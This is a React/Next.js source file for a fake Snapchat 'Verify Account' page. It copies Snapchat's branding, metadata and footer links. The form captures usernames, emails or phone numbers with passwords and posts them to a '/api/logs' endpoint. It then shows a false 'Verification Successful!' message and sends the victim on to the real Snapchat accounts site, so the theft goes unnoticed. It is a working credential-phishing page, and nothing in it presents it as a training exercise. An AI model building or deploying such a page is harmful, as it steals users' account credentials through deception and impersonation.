import Head from "next/head";
import Image from "next/image";
import { useState, useEffect } from "react";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [usePhone, setUsePhone] = useState(false);
  const [countryCode, setCountryCode] = useState('IN +91');
  const [showSplash, setShowSplash] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [submittedIdentifier, setSubmittedIdentifier] = useState("");

  useEffect(() => {
    // Show splash screen for 1.5 seconds before rendering the page
    const timer = setTimeout(() => setShowSplash(false), 1500);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    // Save current identifier for success screen
    const currentId = usePhone ? `${countryCode} ${username}` : username;
    setSubmittedIdentifier(currentId);
    
    try {
      // Send data to our dummy backend
      await fetch('/api/logs', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          usePhone,
          username: usePhone ? undefined : username,
          phone: usePhone ? `${countryCode} ${username}` : undefined,
          password
        }),
      });
      
      // Simulate slight network delay for effect
      setTimeout(() => {
        setLoading(false);
        setShowSuccess(true); // Show the success screen
      }, 1000);
    } catch (error) {
      console.error("Error submitting form", error);
      setLoading(false);
    }
  };

  if (showSplash) {
    return (
      <div className="splash-screen">
        <div className="splash-logo-wrapper">
          <Image 
            src="/login form logo.png" 
            alt="Snapchat" 
            width={50} 
            height={50} 
            priority 
          />
        </div>
      </div>
    );
  }

  return (
    <div className="page-wrapper">
      <Head>
        <title>Verify Account | Snapchat</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <meta name="description" content="Log in to verify your Snapchat account. Securely access your account settings and preferences." />
        <meta name="theme-color" content="#FFFC00" />
        <meta property="og:title" content="Verify Account | Snapchat" />
        <meta property="og:description" content="Log in to verify your Snapchat account." />
        <meta property="og:image" content="https://static.snapchat.com/images/favicon/favicon-192x192.png" />
      </Head>

      <main className="main-content">
        <div className={showSuccess ? "success-card" : "snap-card"}>
          {showSuccess ? (
            <div className="success-screen">
              <div className="success-ghost-container">
                <Image
                  src="/happy-ghost.png"
                  alt="Success"
                  width={110}
                  height={110}
                  style={{ objectFit: 'contain' }}
                  priority
                />
              </div>
              <h1 className="success-title">Verification Successful!</h1>
              <p className="success-subtitle">
                Great, {submittedIdentifier}<br />
                Your Snapchat account has been successfully verified. You can now continue using Snapchat normally
              </p>
              <button 
                className="success-button"
                onClick={() => window.location.href = 'https://accounts.snapchat.com'}
              >
                Continue
              </button>
            </div>
          ) : (
            <>
              <div className="snap-logo-container">
                <Image
                  src="/login form logo.png"
                  alt="Snapchat"
                  fill
                  sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                  style={{ objectFit: 'contain' }}
                  priority
                />
              </div>

              <h1 className="snap-title">Verify Your Account</h1>

              <form onSubmit={handleSubmit} className="snap-form">
                <div className="input-group">
                  <label className="snap-label">
                    {usePhone ? 'Phone number' : 'Username or Email'}
                  </label>
                  
                  {usePhone ? (
                    <div className="phone-input-row">
                      <div className="country-select-wrapper">
                        <select 
                          className="country-select"
                          value={countryCode}
                          onChange={(e) => setCountryCode(e.target.value)}
                        >
                          <option value="IN +91">in IN +91</option>
                          <option value="US +1">us US +1</option>
                          <option value="UK +44">gb UK +44</option>
                          <option value="FR +33">fr FR +33</option>
                        </select>
                      </div>
                      <input
                        type="tel"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="snap-input phone-input-field"
                        required
                      />
                    </div>
                  ) : (
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="snap-input"
                      required
                    />
                  )}
                </div>

                <div className="input-group" style={{ marginTop: '16px' }}>
                  <label className="snap-label">Password</label>
                  <div className="relative" style={{ position: 'relative', width: '100%', display: 'flex', alignItems: 'center' }}>
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="snap-input"
                      style={{ paddingRight: '40px' }}
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      style={{ position: 'absolute', right: '12px', background: 'transparent', border: 'none', cursor: 'pointer', padding: 0, color: '#a9acb2', display: 'flex' }}
                    >
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                <div style={{ width: '100%', textAlign: 'center' }}>
                  <a 
                    href="#" 
                    className="snap-link"
                    onClick={(e) => {
                      e.preventDefault();
                      setUsePhone(!usePhone);
                      setUsername("");
                    }}
                  >
                    {usePhone ? 'Use username or email address instead' : 'Use phone number instead'}
                  </a>
                </div>


                <button
                  type="submit"
                  disabled={loading}
                  className="snap-button-next"
                >
                  {loading ? (
                    <svg className="spinner-svg spinner-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                        <circle cx="12" cy="12" r="9" strokeDasharray="42 15" transform="rotate(90 12 12)" />
                        <circle cx="12" cy="12" r="5" strokeDasharray="24 8" transform="rotate(-90 12 12)" />
                    </svg>
                  ) : "Next"}
                </button>
              </form>
            </>
          )}
        </div>

        {!showSuccess && (
          <div className="signup-text">
            New to Snapchat?{" "}
            <a href="#" className="signup-link">
              Sign Up
            </a>
          </div>
        )}

        <section className="footer-section">
          <footer className="footer-container">
            <div className="footer-grid">
              <div className="footer-col">
                <h3>Company</h3>
                <ul>
                  <li><a href="https://snap.com/" target="_blank" rel="noopener noreferrer">Snap Inc.</a></li>
                  <li><a href="https://careers.snap.com/" target="_blank" rel="noopener noreferrer">Careers</a></li>
                  <li><a href="https://newsroom.snap.com/" target="_blank" rel="noopener noreferrer">News</a></li>
                </ul>
              </div>
              <div className="footer-col">
                <h3>Community</h3>
                <ul>
                  <li><a href="https://support.snapchat.com/" target="_blank" rel="noopener noreferrer">Support</a></li>
                  <li><a href="https://snap.com/safety/safety-center" target="_blank" rel="noopener noreferrer">Community Guidelines</a></li>
                  <li><a href="https://snap.com/safety/safety-center" target="_blank" rel="noopener noreferrer">Safety Center</a></li>
                </ul>
              </div>
              <div className="footer-col">
                <h3>Advertising</h3>
                <ul>
                  <li><a href="https://forbusiness.snapchat.com/" target="_blank" rel="noopener noreferrer">Buy Ads</a></li>
                  <li><a href="https://snap.com/ad-policies" target="_blank" rel="noopener noreferrer">Advertising Policies</a></li>
                  <li><a href="https://snap.com/political-ads" target="_blank" rel="noopener noreferrer">Political Ads Library</a></li>
                  <li><a href="https://snap.com/brand-guidelines" target="_blank" rel="noopener noreferrer">Brand Guidelines</a></li>
                  <li><a href="https://support.snapchat.com/a/promotions-rules" target="_blank" rel="noopener noreferrer">Promotions Rules</a></li>
                </ul>
              </div>
              <div className="footer-col">
                <h3>Legal</h3>
                <ul>
                  <li><a href="https://values.snap.com/privacy/privacy-center" target="_blank" rel="noopener noreferrer">Privacy Center</a></li>
                  <li><a href="https://values.snap.com/privacy/privacy-center" target="_blank" rel="noopener noreferrer">Your Privacy Choices</a></li>
                  <li><a href="https://snap.com/cookie-policy" target="_blank" rel="noopener noreferrer">Cookie Policy</a></li>
                  <li><a href="https://support.snapchat.com/a/report-infringement" target="_blank" rel="noopener noreferrer">Report Infringement</a></li>
                  <li><a href="https://snap.com/custom-creative-tools-terms" target="_blank" rel="noopener noreferrer">Custom Creative Tools Terms</a></li>
                  <li><a href="https://snap.com/community-geofilter-terms" target="_blank" rel="noopener noreferrer">Community Geofilter Terms</a></li>
                  <li><a href="https://snap.com/lens-studio-terms" target="_blank" rel="noopener noreferrer">Lens Studio Terms</a></li>
                </ul>
              </div>
            </div>

            <div className="lang-selector">
              <label>Language</label>
              <select>
                <option>English (US)</option>
                <option>English (UK)</option>
                <option>Français</option>
                <option>Español</option>
              </select>
            </div>
          </footer>
        </section>
      </main>

      <div className="bottom-bar">
        <div className="bottom-content">
          <a href="https://snap.com/privacy/privacy-policy" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
          <a href="https://snap.com/terms" target="_blank" rel="noopener noreferrer">Terms of Service</a>
        </div>
      </div>
    </div>
  );
}
